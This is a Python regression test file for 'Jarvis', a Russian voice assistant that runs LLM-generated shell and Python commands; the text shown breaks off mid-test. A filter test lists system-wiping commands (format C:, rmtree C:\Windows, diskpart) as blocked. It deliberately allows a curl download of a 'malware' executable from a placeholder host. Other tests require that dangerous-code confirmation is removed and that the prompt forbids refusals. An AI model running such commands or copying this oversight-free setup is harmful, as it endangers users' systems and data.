"""
Regression tests for the bugs fixed in the July 2026 audit.

Every test here corresponds to a bug that actually shipped and was reported by
the user (or found by static analysis). They import the REAL functions from
jarvis.py — no reimplementation — so they fail if a fix is ever reverted.

Run: python test_regression.py
"""
import io
import datetime
import os
import re
import sys
import types
from pathlib import Path
from unittest.mock import patch

sys.stdout.reconfigure(encoding="utf-8")

_mock_pyautogui = types.ModuleType("pyautogui")
_mock_pyautogui.size = lambda: (1920, 1080)
_mock_pyautogui.click = lambda *a, **k: None
_mock_pyautogui.press = lambda *a, **k: None
_mock_pyautogui.hotkey = lambda *a, **k: None
sys.modules.setdefault("pyautogui", _mock_pyautogui)

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import jarvis
import jarvis_apps
import jarvis_llm
import jarvis_state
import jarvis_store
import project_agent
import jarvis_tts
import jarvis_telegram


_results = []


def check(name, ok, detail=""):
    _results.append((name, ok, detail))
    print(f"  {'OK  ' if ok else 'FAIL'} {name}" + (f"  — {detail}" if detail and not ok else ""))


def section(title):
    print(f"\n=== {title} ===")


section("BUG 1: _set_done_speaking() recursed infinitely → Jarvis went deaf")
jarvis_state.is_speaking = True
jarvis_state.speaking_cooldown_until = 0.0
try:
    jarvis._set_done_speaking()
    check("_set_done_speaking() does not raise RecursionError", True)
except RecursionError as e:
    check("_set_done_speaking() does not raise RecursionError", False, str(e))

check("_set_done_speaking() actually clears _is_speaking",
      jarvis_state.is_speaking is False,
      f"_is_speaking={jarvis_state.is_speaking}")
check("_set_done_speaking() arms the mic cooldown",
      jarvis_state.speaking_cooldown_until > 0)


section("BUG 2: substring matching hijacked ordinary speech")
MEDIA   = ["пауза", "поставь на паузу", "плей", "продолжи воспроизведение"]
STATS   = ["железо", "цпу", "cpu", "ram", "оперативка", "нагрузка"]
LOCK    = ["заблокируй", "заблокировать", "заблоки", "lock"]
TIME    = ["время", "который час", "time"]

must_not_fire = [
    ("включи плейлист с джазом", MEDIA, "плейлист → play/pause"),
    ("выключи дисплей",          MEDIA, "дисплей → play/pause"),
    ("открой instagram",         STATS, "instagram → system stats"),
    ("напиши пост в telegram",   STATS, "telegram → system stats"),
    ("что такое blockchain",     LOCK,  "blockchain → LOCKED THE PC"),
    ("sometimes i wonder",       TIME,  "sometimes → time"),
]
for phrase, words, why in must_not_fire:
    check(f"не срабатывает: {phrase!r}",
          not jarvis._has_word(phrase, words), why)

must_fire = [
    ("поставь на паузу",       MEDIA),
    ("покажи нагрузку на cpu", STATS),
    ("заблокируй компьютер",   LOCK),
    ("какое сейчас время",     TIME),
    ("нажми плей",             MEDIA),
]
for phrase, words in must_fire:
    check(f"срабатывает: {phrase!r}", jarvis._has_word(phrase, words))

check("_has_word работает с кириллицей (не Python-2 поведение \\b)",
      jarvis._has_word("солнечная система", ["система"])
      and not jarvis._has_word("плейлист", ["плей"]))


section("BUG 3: mentioning a browser opened one")
for phrase in ["какой браузер лучше",
               "расскажи про браузер",
               "почему chrome жрёт память",
               "мне не нравится хром",
               "что такое браузер",
               "как открыть браузер"]:
    check(f"не открывает браузер: {phrase!r}",
          jarvis.detect_intent_from_text(phrase) is None,
          f"вернул {jarvis.detect_intent_from_text(phrase)}")

for phrase, want in [("открой браузер",       "[OPEN:browser]"),
                     ("запусти хром",         "[OPEN:browser]"),
                     ("включи музыку",        "[MUSIC:OPEN]"),
                     ("открой яндекс музыку", "[MUSIC:OPEN]")]:
    got = jarvis.detect_intent_from_text(phrase)
    check(f"настоящая команда работает: {phrase!r} → {want}", got == want, f"получил {got}")


section("BUG 4: wake word — sensitivity vs false positives")
for heard in ["джарвис", "жарвис", "ярвис", "арвис", "жарвес", "jarvis"]:
    check(f"распознаёт обращение: {heard!r}", jarvis.contains_wake_word(heard))

for ordinary in ["нарвись", "сервис", "марвел", "дарвин", "давись", "привет",
                 "спасибо", "срочно", "хорошо"]:
    check(f"НЕ считает обращением: {ordinary!r}",
          not jarvis.contains_wake_word(ordinary))

check("порог чувствительности НЕ откачен назад (пользователь просил чувствительнее)",
      jarvis.WAKE_FUZZY_THRESHOLD <= 0.72,
      f"порог={jarvis.WAKE_FUZZY_THRESHOLD}")
check("блок-лист не трогает правдоподобные ослышки (парвис/харвис/джарси)",
      all(jarvis.contains_wake_word(w) for w in ["парвис", "харвис", "джарси"]))

check("обращение, разбитое на два слова ('жар весь')",
      jarvis.contains_wake_word("жар весь"))
check("strip_wake_word сохраняет команду",
      jarvis.strip_wake_word("джарвис открой браузер") == "открой браузер",
      repr(jarvis.strip_wake_word("джарвис открой браузер")))
check("strip_wake_word на одном обращении даёт пусто",
      jarvis.strip_wake_word("джарвис") == "")


section("BUG 5: TTS engine consistency (two-voices bug)")
# Исходник ядра целиком. Проверки вида «такая-то строка есть в ядре» не должны
# зависеть от того, в каком файле она лежит: монолит jarvis.py разбирается на
# модули, и новые jarvis_*.py подхватываются здесь автоматически.
_CORE_DIR = os.path.dirname(os.path.abspath(__file__))
CORE_FILES = tuple(sorted(f for f in os.listdir(_CORE_DIR)
                          if f.startswith("jarvis") and f.endswith(".py")))


def module_src(name):
    path = os.path.join(_CORE_DIR, name)
    if not os.path.exists(path):
        return ""
    return open(path, encoding="utf-8").read()


def source_containing(marker):
    """Исходник того модуля ядра, где определён marker."""
    for name in CORE_FILES:
        text = module_src(name)
        if marker in text:
            return text
    raise AssertionError("не найден ни в одном модуле ядра: %s" % marker)


src = "\n".join(module_src(name) for name in CORE_FILES)

with patch.object(jarvis_tts, "_effective_tts_engine", return_value="edge"), \
        patch.object(jarvis_tts, "_edge_tts_to_bytes", return_value=None), \
        patch.object(jarvis_tts, "_piper_to_wav_bytes") as _piper, \
        patch.object(jarvis_tts, "_xtts_to_wav_bytes") as _xtts:
    _audio = jarvis_tts.tts_to_bytes("Проверка выбора голоса")
    check("piper НЕ используется как fallback при TTS_ENGINE=edge",
          _audio == (None, None) and not _piper.called and not _xtts.called)

# Настройки из jarvis_config.json попадают в окружение в _load_config(). Если
# ядро успеет прочитать os.getenv раньше, значение из файла молча потеряется —
# именно так TTS_ENGINE из конфига долгое время игнорировался.
_tts_owner = source_containing('os.getenv("TTS_ENGINE"')
check("конфиг загружается раньше первого чтения настроек движка",
      _tts_owner.index("from jarvis_config import") <
      _tts_owner.index('os.getenv("TTS_ENGINE"'))
check("кэш TTS помечен текущим движком (а не всегда piper)",
      "engine = effective" in src)
check("ключ кэша учитывает голос, а не только движок",
      'f"{engine}:{voice_id}:{phrase}"' in src and "voice_id = " in src)
check("в шаблоне конфига голос по умолчанию — низкий мужской (ruslan, ~114 Гц)",
      '"PIPER_VOICE": "ruslan"' in Path("jarvis_config.example.json").read_text(encoding="utf-8"))
check("_set_done_speaking() не вызывает сам себя",
      "_set_done_speaking()" not in
      src.split("def _set_done_speaking():")[1].split("\ndef ")[0])


section("BUG 6: logging must capture every action")
check("логгер на уровне DEBUG", jarvis.jarvis_logger.level == 10)
check("у логгера есть файловый handler", len(jarvis.jarvis_logger.handlers) >= 1)
check("логгер не дублирует в root", jarvis.jarvis_logger.propagate is False)
for tag in ["[SPEAK]", "[STT]", "[TTS:edge]", "[STT→CMD]", "[LLM:stream]", "[STARTUP]"]:
    check(f"логируется {tag}", tag in src)


section("BUG 7: логика выдачи ответов (_llm_deltas)")
import queue as _q
import time as _t


def _run_llm(local_engine, cloud_engine, deadline=0.3):
    """Drive the REAL _llm_deltas with stubbed engines."""
    saved = (jarvis_llm._ollama_deltas, jarvis_llm._cloud_deltas,
             jarvis_llm._ollama_available, jarvis_llm.OPENROUTER_API_KEY,
             jarvis_llm.LLM_ENGINE, jarvis_llm.LLM_DEADLINE)
    jarvis_llm._ollama_deltas = lambda m, **kw: local_engine()
    jarvis_llm._cloud_deltas = lambda m, **kw: cloud_engine()
    jarvis_llm._ollama_available = lambda **kwargs: True
    jarvis_llm.OPENROUTER_API_KEY = "test-key"
    jarvis_llm.LLM_ENGINE = "local"
    jarvis_llm.LLM_DEADLINE = deadline
    try:
        return list(jarvis_llm._llm_deltas(
            [{"role": "user", "content": "тест"}], prefer="local"))
    finally:
        (jarvis_llm._ollama_deltas, jarvis_llm._cloud_deltas,
         jarvis_llm._ollama_available, jarvis_llm.OPENROUTER_API_KEY,
         jarvis_llm.LLM_ENGINE, jarvis_llm.LLM_DEADLINE) = saved


def _empty_engine():
    for _ in range(3):
        yield ""


def _good_cloud():
    for t in ["Привет", ", ", "сэр."]:
        yield t


def _hanging_engine():
    _t.sleep(2.0)
    yield "поздно"


def _boom_engine():
    raise ConnectionError("сеть недоступна")
    yield


out = _run_llm(_empty_engine, _good_cloud)
check("пустой ответ локального движка → откат в облако (а не молчание)",
      out == ["Привет", ", ", "сэр."], f"получил {out}")

t0 = _t.perf_counter()
out = _run_llm(_hanging_engine, _good_cloud, deadline=0.3)
elapsed = _t.perf_counter() - t0
check("дедлайн первого токена соблюдается, когда движок молчит",
      elapsed < 1.0 and out == ["Привет", ", ", "сэр."],
      f"ждали {elapsed:.2f}с (дедлайн 0.3с), отдал {out}")

out = _run_llm(_boom_engine, _good_cloud)
check("ошибка транспорта → откат в облако", out == ["Привет", ", ", "сэр."], f"получил {out}")

try:
    _run_llm(_empty_engine, _empty_engine)
    check("оба движка пусты → исключение (а не тихий пустой ответ)", False, "не бросил")
except Exception:
    check("оба движка пусты → исключение (а не тихий пустой ответ)", True)

check("_pump_engine существует (дедлайн прерываем через очередь)",
      hasattr(jarvis, "_pump_engine"))
check("_cloud_deltas переживает чанк с choices=[] (финальный usage от OpenRouter)",
      "if not getattr(chunk, \"choices\", None):" in src)


section("BUG 8: окончание прослушки (окно после обращения)")
class _FakeAudio:
    """Mimics speech_recognition.AudioData sizing."""
    def __init__(self, seconds, rate=16000, width=2):
        self.sample_rate = rate
        self.sample_width = width
        self.frame_data = b"\x00" * int(seconds * rate * width)


check("_audio_duration считает длину фразы",
      abs(jarvis._audio_duration(_FakeAudio(3.2)) - 3.2) < 0.01,
      f"{jarvis._audio_duration(_FakeAudio(3.2)):.3f}")
check("_audio_duration не падает на мусоре",
      jarvis._audio_duration(object()) == 0.0)

_wake_opened_at = 1000.0
_window_until = _wake_opened_at + 5.0
_spoke_from, _spoke_len, _stt = 1002.6, 3.2, 0.37
_callback_at = _spoke_from + _spoke_len + _stt

check("СТАРОЕ поведение отбрасывало команду (подтверждение бага)",
      not (_callback_at < _window_until))
check("НОВОЕ поведение принимает команду (окно от начала фразы)",
      (_callback_at - _spoke_len - _stt) < _window_until)
check("callback берёт phrase_start, а не time.time()",
      "in_wake_window = phrase_start < _state.wake_active_until" in src)
check("phrase_start вычисляется ДО STT",
      src.index("phrase_start = time.time() - _audio_duration(audio)")
      < src.index("text = transcribe_speech(recognizer, audio)"))


section("BUG 9: создание голоса (edge-tts + кэш)")
check("голос edge задан одной константой (не продублирован литералом)",
      hasattr(jarvis, "EDGE_VOICE") and src.count('"ru-RU-DmitryNeural"') <= 1)
check("event loop закрывается в finally (утечка на каждой сетевой ошибке)",
      src.count("loop.close()\n            asyncio.set_event_loop(None)") == 2)
check("кэш требует совпадения расширения с движком",
      'existing = _TTS_CACHE_DIR / f"{h}.{_cache_ext()}"' in src)
check("кэш сам удаляет файлы от другого движка",
      "удалён файл от другого движка" in src)

import hashlib
from pathlib import Path as _P
_cache = _P(os.path.dirname(os.path.abspath(__file__))) / "tts_cache"
if _cache.exists():
    _bad = []
    for _p in jarvis.INSTANT_PHRASES:
        _h = hashlib.md5(f"edge:{_p}".encode("utf-8")).hexdigest()[:12]
        for _f in _cache.glob(f"{_h}.*"):
            if _f.suffix != ".mp3":
                _bad.append((_p, _f.name))
    check("в кэше нет файлов от чужого движка", not _bad, f"найдено: {_bad}")


section("BUG 10: инструменты — каждый рекламируемый тег исполняется")
_stub_names = ("execute_system_command", "play_yandex_music", "search_web", "type_text",
               "set_volume", "media_control", "take_screenshot", "lock_pc", "set_brightness",
               "read_calendar_events", "add_calendar_event", "ob_write", "ob_append",
               "ob_search", "ob_read", "ob_list_notes", "ob_delete", "get_weather",
               "get_system_stats", "remember", "recall", "todo_add", "todo_list",
               "todo_done", "set_timer", "execute_python_code", "run_shell_command",
               "telegram_list_chats", "telegram_read_dialog", "telegram_search_dialog",
               "telegram_export_dialog", "telegram_request_send", "lookup_identity")
_saved_fns = {n: getattr(jarvis, n) for n in _stub_names if hasattr(jarvis, n)}
for n in _saved_fns:
    setattr(jarvis, n, lambda *a, **k: "ок")

_feat_stub_names = (
    "window_show_desktop", "window_minimize_active", "window_maximize_active",
    "window_close_active", "window_switch", "clipboard_read", "clipboard_paste",
    "reminder_add", "reminder_add_in_seconds", "reminders_list",
    "open_latest_download", "find_files", "open_path",
    "ocr_screen", "gmail_unread", "session_summary", "session_clear",
)
_saved_feat = {n: getattr(jarvis._feat, n) for n in _feat_stub_names}
for n in _saved_feat:
    setattr(jarvis._feat, n, lambda *a, **k: "ок")

ADVERTISED = [
    "[OPEN:browser]", "[OPEN:notepad]", "[OPEN:calc]", "[MUSIC:OPEN]",
    "[MUSIC:PLAY:Prodigy]", "[SEARCH:погода]", "[SYS:VOL:50]", "[MEDIA:PLAYPAUSE]",
    "[MEDIA:NEXT]", "[MEDIA:PREV]", "[TYPE:привет]", "[CAL:READ:сегодня]",
    "[CAL:ADD:15:30:встреча]", "[MEMORY:REMEMBER:муз:jazz]", "[MEMORY:RECALL]",
    "[TODO:ADD:хлеб]", "[TODO:LIST]", "[TODO:DONE:1]", "[TIMER:600:чай]",
    "[WEATHER:Москва]", "[SYSINFO]", "[SCREENSHOT]", "[LOCK]", "[BRIGHT:70]",
    "[OB:WRITE:Т:с]", "[OB:APPEND:Т:е]", "[OB:SEARCH:в]", "[OB:READ:Т]",
    "[OB:LIST]", "[OB:DELETE:Т]", "[TG:CHATS]", "[TG:READ:Иван:10]",
    "[TG:SEARCH:Иван:договор]", "[TG:EXPORT:Иван:200]",
    "[TG:SEND:Иван:буду через час]", "[CMD:Get-Process]",
    "[WIN:DESKTOP]", "[WIN:MINIMIZE]", "[WIN:MAXIMIZE]", "[WIN:CLOSE]",
    "[WIN:SWITCH:Chrome]", "[CLIP:READ]", "[CLIP:PASTE]",
    "[REMIND:18:30:молоко]", "[REMIND:IN:60:чай]", "[REMIND:LIST]",
    "[FILE:LATEST]", "[FILE:FIND:отчет]", "[FILE:OPEN:C:/tmp/a.txt]",
    "[OCR]", "[OCR:WINDOW]", "[MAIL:UNREAD]",
    "[SESSION:SUMMARY]", "[SESSION:CLEAR]",
    "[LOOKUP:TG:durov]", "[LOOKUP:PHONE:+79991234567]",
]
_leaked = []
for tag in ADVERTISED:
    out = (jarvis.parse_and_execute_tags(tag, "") or "").strip()
    prefix = tag.split(":")[0].lstrip("[")
    if prefix in out:
        _leaked.append((tag, out))
check(f"все {len(ADVERTISED)} рекламируемых тегов исполняются (ни один не озвучивается сырым)",
      not _leaked, f"не обработаны: {_leaked}")

for n, fn in _saved_fns.items():
    setattr(jarvis, n, fn)
for n, fn in _saved_feat.items():
    setattr(jarvis._feat, n, fn)


section("BUG 11: [CMD] — выполнение команд в терминале")
check("run_shell_command существует", hasattr(jarvis, "run_shell_command"))
_r = jarvis.run_shell_command("Write-Output 'КИРИЛЛИЦА-ТЕСТ 42'")
check("реальная команда PowerShell выполняется", "42" in _r, repr(_r))
check("вывод с кириллицей не превращается в кракозябры (OEM→UTF-8)",
      "КИРИЛЛИЦА-ТЕСТ" in _r, repr(_r))
check("пустая команда не падает", "сэр" in jarvis.run_shell_command(""))
check("ошибочная команда возвращает сообщение, а не исключение",
      "сэр" in jarvis.run_shell_command("This-Cmdlet-Does-Not-Exist-XYZ"))
_long = jarvis.run_shell_command("1..500 | ForEach-Object { 'строка' }")
check("длинный вывод усечён (не зачитывать 500 строк вслух)", len(_long) < 400,
      f"длина {len(_long)}")


section("BUG 12: маршрутизация LLM — локалка для простого, DeepSeek для сложного")
SIMPLE_Q = ["привет", "который час", "открой браузер", "какая погода в москве",
            "включи музыку", "поставь таймер на 5 минут", "как тебя зовут",
            "спасибо", "заблокируй пк", "расскажи анекдот"]
COMPLEX_Q = ["напиши python скрипт для сортировки файлов",
             "выполни команду ipconfig в терминале",
             "найди в интернете новости про nvidia и сделай выжимку",
             "отладь мой код там ошибка в цикле",
             "запусти powershell и покажи занятое место на диске",
             "напиши класс для работы с sqlite",
             "сравни rust и go для бэкенда подробно",
             "напиши регулярное выражение для email",
             "проанализируй логи и найди причину падения",
             "сделай рефактор этой функции"]

_mis_simple = [q for q in SIMPLE_Q if jarvis_llm._classify_complexity(q)[0] != "local"]
_mis_complex = [q for q in COMPLEX_Q if jarvis_llm._classify_complexity(q)[0] != "cloud"]
check("простые запросы → локалка (Ollama)", not _mis_simple, f"ушли в облако: {_mis_simple}")
check("сложные запросы → облако (DeepSeek)", not _mis_complex, f"остались на локалке: {_mis_complex}")

check("_llm_deltas принимает prefer", "prefer" in __import__("inspect").signature(jarvis_llm._llm_deltas).parameters)
check("_cloud_deltas принимает max_tokens",
      "max_tokens" in __import__("inspect").signature(jarvis_llm._cloud_deltas).parameters)
check("первый токен: локальный дедлайн допускает холодную загрузку, облачный независим",
      25 <= jarvis_llm.LLM_DEADLINE <= 60 and 1 <= jarvis_llm.LLM_DEADLINE_CLOUD <= 30)

_order = []
def _spy_pump(engine, messages):
    import queue as _qq
    q = _qq.Queue()
    q.put(("delta", "x")); q.put(("end", None))
    return q
_savedpump, _savedlocal, _savedcloud = jarvis_llm._pump_engine, jarvis_llm._ollama_deltas, jarvis_llm._cloud_deltas
_savedavail, _savedkey, _savedeng = jarvis_llm._ollama_available, jarvis_llm.OPENROUTER_API_KEY, jarvis_llm.LLM_ENGINE
try:
    jarvis_llm._ollama_available = lambda **kwargs: True
    jarvis_llm.OPENROUTER_API_KEY = "k"
    jarvis_llm.LLM_ENGINE = "local"
    def _mk(tag):
        def _e(m, **kw):
            _order.append(tag); yield "x"
        return _e
    jarvis_llm._ollama_deltas = _mk("local")
    jarvis_llm._cloud_deltas = _mk("cloud")
    _order.clear(); list(jarvis_llm._llm_deltas([{"role":"user","content":"x"}], prefer="local"))
    _first_local = _order[0] if _order else None
    _order.clear(); list(jarvis_llm._llm_deltas([{"role":"user","content":"x"}], prefer="cloud"))
    _first_cloud = _order[0] if _order else None
    check("prefer=local → первым идёт локальный движок", _first_local == "local", _first_local)
    check("prefer=cloud → первым идёт облачный движок", _first_cloud == "cloud", _first_cloud)
finally:
    (jarvis_llm._pump_engine, jarvis_llm._ollama_deltas, jarvis_llm._cloud_deltas,
     jarvis_llm._ollama_available, jarvis_llm.OPENROUTER_API_KEY, jarvis_llm.LLM_ENGINE) = (
        _savedpump, _savedlocal, _savedcloud, _savedavail, _savedkey, _savedeng)


section("BUG 13: ROADMAP A1 — LLM никогда не молчит")
_spoken = []
_saved = (jarvis.speak, jarvis.speak_streaming, jarvis.ui_state, jarvis.ui_msg,
          jarvis.ui_lat, jarvis.ui_clear_lat, jarvis_llm._ollama_deltas,
          jarvis_llm._cloud_deltas, jarvis_llm._ollama_available, jarvis_llm.OPENROUTER_API_KEY,
          jarvis_llm.LLM_ENGINE)
jarvis.speak = lambda t: _spoken.append(t)
jarvis.speak_streaming = lambda it: _spoken.append(" ".join(list(it)))
for _u in ("ui_state", "ui_msg", "ui_lat", "ui_clear_lat"):
    setattr(jarvis, _u, lambda *a, **k: None)
jarvis_llm._ollama_available = lambda **kwargs: True
jarvis_llm.OPENROUTER_API_KEY = "k"
jarvis_llm.LLM_ENGINE = "local"


def _empty_stream(m, **kw):
    for _ in range(2):
        yield ""


try:
    jarvis_llm._ollama_deltas = _empty_stream
    jarvis_llm._cloud_deltas = _empty_stream
    _spoken.clear()
    ret = jarvis.process_with_llm_streaming("расскажи что-нибудь")
    check("оба движка пусты → Джарвис ГОВОРИТ (не тишина)", len(_spoken) >= 1, f"_spoken={_spoken}")
    check("fallback сообщает причину отказа моделей",
          any("Модели не дали ответа" in s and "пустой ответ" in s for s in _spoken), _spoken)
    check("process_with_llm_streaming возвращает текст, а не пусто", bool(ret), repr(ret))

    def _err_json_stream(m, **kw):
        raise RuntimeError("ollama error: model runner has stopped")
        yield
    jarvis_llm._ollama_deltas = _err_json_stream
    jarvis_llm._cloud_deltas = lambda m, **kw: (t for t in ["Готово", ", сэр."])
    _spoken.clear()
    ret = jarvis.process_with_llm_streaming("привет")
    check("ошибка Ollama → откат в облако, ответ получен", "Готово" in (ret or ""), repr(ret))
finally:
    (jarvis.speak, jarvis.speak_streaming, jarvis.ui_state, jarvis.ui_msg,
     jarvis.ui_lat, jarvis.ui_clear_lat, jarvis_llm._ollama_deltas,
     jarvis_llm._cloud_deltas, jarvis_llm._ollama_available, jarvis_llm.OPENROUTER_API_KEY,
     jarvis_llm.LLM_ENGINE) = _saved

check("_ollama_deltas ловит error-поле и логирует его",
      'jarvis_logger.error(f"[LLM:ollama] error в теле ответа' in src)
check("счётчик пустых фолловеров ведётся", "_state.llm_empty_failovers" in src)


section("BUG 14: anti-wipe filter (блок ТОЛЬКО сноса системы/проектов)")
_WIPE = [
    ("rmtree C:\\Windows",      r'shutil.rmtree(r"C:\Windows")'),
    ("format C:",               'subprocess.run("format C: /q")'),
    ("diskpart",                'subprocess.run("diskpart")'),
    ("wipe JARVIS repo",        r'shutil.rmtree(r"C:\Users\user\Documents\JARVIS")'),
    ("reg delete HKLM\\SYSTEM", r'reg delete "HKLM\SYSTEM\X" /f'),
    ("wipe drive root",         r'shutil.rmtree("C:\\")'),
    ("empty",                   ""),
]
_OK = [
    ("pyautogui",               'pyautogui.moveTo(1,1)'),
    ("Popen calc",              'subprocess.Popen("calc.exe")'),
    ("single-file delete",      r'os.remove(r"C:\Users\user\Desktop\a.txt")'),
    ("download exe (malware)",  'subprocess.call("curl -o m.exe http://x/y.exe")'),
    ("rmtree Downloads",        'shutil.rmtree("C:/Users/user/Downloads")'),
    ("exec/eval",               "exec('x=1'); eval('1+1')"),
    ("str.format",              '"{}".format(1)'),
]
for desc, code in _WIPE:
    ok, _r = jarvis.is_code_safe(code)
    check(f"BLOCK: {desc}", not ok)
for desc, code in _OK:
    ok, _r = jarvis.is_code_safe(code)
    check(f"ALLOW: {desc}", ok, f"reason={_r}")

_blk = jarvis.execute_python_code(r'import shutil; shutil.rmtree(r"C:\Windows")')
check("execute_python_code ОТКАЗЫВАЕТ снос (не исполняет)",
      "Не могу трогать систему" in _blk, repr(_blk))
_okc = jarvis.execute_python_code("x = 1 + 1")
check("execute_python_code исполняет безопасный код", "выполнена" in _okc, repr(_okc))
_blkcmd = jarvis.run_shell_command(r"Remove-Item C:\Windows -Recurse -Force")
check("run_shell_command ОТКАЗЫВАЕТ снос системы",
      "Не могу трогать систему" in _blkcmd, repr(_blkcmd))

check("голосового подтверждения НЕТ (pending_dangerous_code удалён)",
      "pending_dangerous_code = None" not in src)
check("is_code_safe больше не заглушка (нет 'NO RESTRICTIONS')",
      "NO RESTRICTIONS" not in src)


section("BUG 15: lean system prompt (без jailbreak-романа)")
_prompt = jarvis.SYSTEM_PROMPT_BASE
_low = _prompt.lower()
for _bad in ("evil", "emperor", "malware", "yin yang", "keylogger", "rat", "virus"):
    check(f"промпт не содержит '{_bad}'", _bad not in _low, f"найдено: {_bad}")
check("промпт остаётся tag-first (есть таблица тегов)", "ТЕГИ ДЕЙСТВИЙ" in _prompt)
check("промпт краткий (≤ 7000 симв., включая v1.1 теги)", len(_prompt) <= 7000, f"длина={len(_prompt)}")
check("сохранена роль J.A.R.V.I.S. + «сэр»",
      "J.A.R.V.I.S" in _prompt and "сэр" in _prompt)
check("промпт явно без тематических отказов",
      "без тематических отказов" in _low and "не морализируй" in _low)
check("веб-поиск без SafeSearch",
      'safesearch="off"' in src or "safesearch='off'" in src)
for _tag in ("[OPEN:", "[MUSIC:", "[SEARCH:", "[SYS:VOL:", "[MEDIA:", "[TYPE:",
             "[CAL:READ", "[CAL:ADD", "[MEMORY:", "[TODO:", "[TIMER:", "[WEATHER",
             "[SYSINFO]", "[SCREENSHOT]", "[LOCK]", "[BRIGHT:", "[OB:", "[TG:", "[CMD:",
             "[EXECUTE_PYTHON]", "[WIN:", "[CLIP:", "[REMIND:", "[FILE:", "[OCR]",
             "[MAIL:UNREAD]", "[SESSION:", "[LOOKUP:TG:", "[LOOKUP:PHONE:"):
    check(f"тег {_tag} описан в промпте", _tag in _prompt)


section("BUG 16: обрыв на полуслове + окно продолжения диалога")
check("порог тишины не режет на полуслове (≥1.0 с)",
      jarvis.PAUSE_THRESHOLD >= 1.0, f"PAUSE_THRESHOLD={jarvis.PAUSE_THRESHOLD}")
check("порог тишины настраивается через env, а не захардкожен",
      "JARVIS_PAUSE_THRESHOLD" in src)
check("pause_threshold берётся из константы (0.4 не вернётся)",
      "recognizer.pause_threshold = PAUSE_THRESHOLD" in src)
check("non_speaking_duration <= pause_threshold (требование speech_recognition)",
      min(0.4, jarvis.PAUSE_THRESHOLD) <= jarvis.PAUSE_THRESHOLD)

check("окно продолжения диалога = 15 с", jarvis.FOLLOWUP_WINDOW >= 15.0,
      f"FOLLOWUP_WINDOW={jarvis.FOLLOWUP_WINDOW}")

_t_before = _t.time()
jarvis_state.is_speaking = True
jarvis._set_done_speaking()
check("после речи окно продолжения взведено (~15 с)",
      jarvis_state.wake_active_until >= _t_before + 14.0,
      f"осталось {jarvis_state.wake_active_until - _t_before:.1f} с")
check("mic-cooldown всё ещё ставится (защита от самопрослушки)",
      jarvis_state.speaking_cooldown_until > _t_before)

for _stray in ["ага", "угу", "хм", "ну", "э", "а", "вот",
               "продолжение следует...", "Субтитры сделал DimaTorzok",
               "Спасибо за просмотр!"]:
    check(f"игнорирует не-команду: {_stray!r}", jarvis._is_stray_speech(_stray))

for _cmd in ["открой браузер", "который час", "включи музыку",
             "напиши скрипт на python", "да, открой", "стоп"]:
    check(f"принимает как команду: {_cmd!r}", not jarvis._is_stray_speech(_cmd))


section("BUG 17: длинный вопрос не обрывается после обращения")
check("порог паузы допускает обдумывание вопроса (≥2.5 с)",
      jarvis.PAUSE_THRESHOLD >= 2.5, f"PAUSE_THRESHOLD={jarvis.PAUSE_THRESHOLD}")
check("тихое окно после отдельного wake-word ≥8 с",
      jarvis.WAKE_COMMAND_WINDOW >= 8.0)
check("длинная фраза не режется старым лимитом 25 с",
      jarvis.PHRASE_TIME_LIMIT >= 40.0)
check("background listener использует настраиваемый лимит фразы",
      "phrase_time_limit=PHRASE_TIME_LIMIT" in src)
_wake_branch_start = src.index('if command == "__WAKE__":')
_wake_branch_end = src.index('                    continue', _wake_branch_start)
_wake_branch = src[_wake_branch_start:_wake_branch_end]
check("отдельный wake-word больше не вызывает TTS поверх вопроса",
      "speak(" not in _wake_branch)


section("погода, таймер, память и задачи работают без LLM")
_orig_weather = jarvis.get_weather
_orig_timer = jarvis.set_timer
_orig_remember = jarvis.remember
_orig_recall = jarvis.recall
_orig_todo_add = jarvis.todo_add
_orig_todo_list = jarvis.todo_list
_orig_todo_done = jarvis.todo_done
_local_calls = []
try:
    jarvis.get_weather = lambda city="Москва": _local_calls.append(("weather", city)) or f"WEATHER:{city}"
    jarvis.set_timer = lambda seconds, label="", speak_fn=None: _local_calls.append(("timer", seconds, label))
    jarvis.remember = lambda key, value: _local_calls.append(("remember", key, value)) or "ok"
    jarvis.recall = lambda key=None: _local_calls.append(("recall", key)) or "MEMORY"
    jarvis.todo_add = lambda task: _local_calls.append(("todo_add", task)) or f"ADD:{task}"
    jarvis.todo_list = lambda: _local_calls.append(("todo_list",)) or "TODO"
    jarvis.todo_done = lambda n: _local_calls.append(("todo_done", n)) or f"DONE:{n}"

    check("погода идёт локально",
          jarvis.handle_local_productivity_command("какая погода в Москве") == "WEATHER:Москва")
    check("таймер с числом словами идёт локально",
          "Таймер на 10 мин" in jarvis.handle_local_productivity_command(
              "поставь таймер на десять минут", speak_fn=lambda _: None))
    check("десять минут распознаны как 600 секунд",
          ("timer", 600, "") in _local_calls)
    check("полчаса распознаётся", jarvis.parse_timer_duration("таймер на полчаса") == 1800)
    check("запомни идёт локально",
          jarvis.handle_local_productivity_command("запомни мой цвет синий") == "Запомнил, сэр.")
    check("чтение памяти идёт локально",
          str(jarvis.handle_local_productivity_command("что ты помнишь")).startswith("MEMORY"))
    check("добавление задачи идёт локально",
          jarvis.handle_local_productivity_command("добавь задачу купить молоко") == "ADD:купить молоко")
    check("завершение задачи идёт локально",
          jarvis.handle_local_productivity_command("выполнил задачу 2") == "DONE:2")
    check("список дел идёт локально",
          jarvis.handle_local_productivity_command("покажи список дел") == "TODO")
    check("обычное упоминание погоды не перехватывается",
          jarvis.handle_local_productivity_command("обсудим прогноз погоды в сериале") is None)
finally:
    jarvis.get_weather = _orig_weather
    jarvis.set_timer = _orig_timer
    jarvis.remember = _orig_remember
    jarvis.recall = _orig_recall
    jarvis.todo_add = _orig_todo_add
    jarvis.todo_list = _orig_todo_list
    jarvis.todo_done = _orig_todo_done

_fixed_now = datetime.datetime(2026, 8, 20, 15, 42)
check("день недели определяется локально",
      jarvis.get_datetime_reply("какой сегодня день недели", _fixed_now) ==
      "Сегодня четверг, сэр.")
check("число определяется локально",
      jarvis.get_datetime_reply("какое сегодня число", _fixed_now) ==
      "Сегодня 20 число, сэр.")
check("полная дата определяется локально",
      "20 августа 2026 года" in jarvis.get_datetime_reply(
          "какая сегодня дата", _fixed_now))
check("время определяется локально",
      jarvis.get_datetime_reply("который час", _fixed_now) ==
      "Сейчас 15:42, сэр.")
check("обычный разговор о времени не перехватывается",
      jarvis.get_datetime_reply("расскажи про путешествия во времени", _fixed_now) is None)
check("погугли извлекает поисковый запрос",
      jarvis.extract_web_search_query("погугли новости космоса") == "новости космоса")
check("явный поиск в интернете извлекает запрос",
